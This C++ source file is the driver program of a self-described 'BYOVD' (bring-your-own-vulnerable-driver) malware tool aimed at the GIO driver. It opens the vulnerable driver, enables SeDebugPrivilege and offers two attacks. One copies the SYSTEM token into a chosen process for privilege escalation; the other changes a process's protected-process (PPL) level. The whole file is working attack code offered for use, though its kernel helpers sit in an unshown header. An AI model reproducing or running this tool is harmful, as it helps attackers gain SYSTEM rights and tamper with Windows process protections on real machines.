// First try of creating a BYOVD malware - target GIO
//

#include <stdlib.h>


#include "functions.h"


#define PATH_TO_DRIVER L"\\\\.\\GIO"
void print_banner_BYOVD() {
    std::string S = R"(
    _____  ______ _   _____               
   / _ ) \/ / __ \ | / / _ \              
  / _  |\  / /_/ / |/ / // /              
 /____/ /_/\____/|___/____/     
    )";
    std::cout << S << std::endl;
}

void print_banner_LPE() {
    std::string S = R"(
    ___      _      _ __
   / _ \____(_)  __(_) /__ ___ ____       
  / ___/ __/ / |/ / / / -_) _ `/ -_)      
 /_/  /_/ /_/|___/_/_/\__/\_, /\__/       
    ____             __  /___/  _         
   / __/__ _______ _/ /__ _/ /_(_)__  ___ 
  / _/(_-</ __/ _ `/ / _ `/ __/ / _ \/ _ \
 /___/___/\__/\_,_/_/\_,_/\__/_/\___/_//_/
                                          
)";
    
    std::cout << S << std::endl;
    std::cout << "BYOVD Privilege Escalation Malware by MM\n" << std::endl;
}

void print_banner_PPL() {
    std::string S = R"(

                                          
)";

    std::cout << S << std::endl;
    std::cout << "BYOVD PPL byPass Malware by MM\n" << std::endl;
}

void do_LPE(DriverOps * driver) {
    print_banner_LPE();

    print(OutputMode::_INFO, "LPE has started");

    RTL_PROCESS_MODULE_INFORMATION ntoskrnlInfo = { 0 };

    if (int err_code = NTGetNtoskrnlInfo(&ntoskrnlInfo)) {
        throw std::string{ "Couldn't get ntoskrnl information! Error code: " } + std::to_string(err_code);
    }
    else if (ntoskrnlInfo.ImageBase == NULL) {
        throw std::string{ "Couldn't get ntoskrnl information, Pointer is NULL!" };
    }

    print(OutputMode::_SUCCESS, "Got ntoskrnl information!");
    std::cout << "Base Address: " << ntoskrnlInfo.ImageBase << std::endl;

    DWORD64 systemProcess;
    DWORD64 targetProcess;
    ULONG64 targetPID = 0;

    printf("Provide target PID: ");
    scanf_s("%lu", &targetPID);
    if (targetPID <= 4) {
        throw std::string{ "Incorrect PID" };
    }

    if (int err_code = getEPROCESSES(driver, &systemProcess, &targetProcess, ntoskrnlInfo.ImageBase, targetPID)) {
        throw std::string{ "Couldn't scrap EProcesses! Error code: " } + std::to_string(err_code);
    }
    print(OutputMode::_SUCCESS, "Got both EProcesses!");

    if (!stealToken(driver, systemProcess, targetProcess)) {
        throw std::string{ "Couldn't copy token values to target" };
    }
    print(OutputMode::_SUCCESS, "Successfully copied token value to target!");

    print(OutputMode::_SUCCESS, "PPL Done!");
}

void do_PPLbyPass(DriverOps* driver) {
    print_banner_PPL();

    print(OutputMode::_INFO, "PPL has started");

    RTL_PROCESS_MODULE_INFORMATION ntoskrnlInfo = { 0 };

    if (int err_code = NTGetNtoskrnlInfo(&ntoskrnlInfo)) {
        throw std::string{ "Couldn't get ntoskrnl information! Error code: " } + std::to_string(err_code);
    }
    else if (ntoskrnlInfo.ImageBase == NULL) {
        throw std::string{ "Couldn't get ntoskrnl information, Pointer is NULL!" };
    }

    print(OutputMode::_SUCCESS, "Got ntoskrnl information!");
    std::cout << "Base Address: " << ntoskrnlInfo.ImageBase << std::endl;

    DWORD64 systemProcess;
    DWORD64 targetProcess;
    ULONG64 targetPID = 0;

    printf("Provide target PID: ");
    scanf_s("%lu", &targetPID);
    if (targetPID <= 4) {
        throw std::string{ "Incorrect PID" };
    }

    if (int err_code = getEPROCESSES(driver, &systemProcess, &targetProcess, ntoskrnlInfo.ImageBase, targetPID)) {
        throw std::string{ "Couldn't scrap EProcesses! Error code: " } + std::to_string(err_code);
    }
    print(OutputMode::_SUCCESS, "Got both EProcesses!");

    if (!elevatePPL(driver, targetProcess)) {
        throw std::string{ "Couldn't change protection values to target" };
    }
    print(OutputMode::_SUCCESS, "Successfully elevated PPL to target!");

    print(OutputMode::_SUCCESS, "PPL Completed!");
}

int main() {
    try {
        print_banner_BYOVD();

        if (!EnablePrivilege(SE_DEBUG_NAME)) {
            throw std::string{ "Can't enable SeDebugPrivilege!" };
        }
        print(OutputMode::_SUCCESS, "SeDebugPivilege enabled!");

        std::string currentVersion{};
        if (!loadOffsets(currentVersion)) {
            throw std::string{ "Unsupported Windows build: " + currentVersion };
        }
        print(OutputMode::_SUCCESS, "Offsets loaded successfully, winver: " + currentVersion);

        DriverOps driver{};
        if (driver.openDriver(PATH_TO_DRIVER) == NULL) {
            throw std::string{ "Cannot open driver!" };
        }
        print(OutputMode::_SUCCESS, "Opened and got a handle to vulnerable driver!");

        printf("\n");
        print(OutputMode::_INFO, "Choose job:\n 1 - LPE\n 2 - PPL bypass");

        int job = 0;
        scanf_s("%d", &job);

        if (job == 1) do_LPE(&driver);
        else if (job == 2) do_PPLbyPass(&driver);

        else {
            print(OutputMode::_ERROR, "Unexpected value " + std::to_string(job));
        }

        std::cout << std::endl << "Press any button to close the window..." << std::endl;
        getchar();
        return 0;
    }
    catch (std::string msg) {
        print(OutputMode::_ERROR, msg);
    }
}


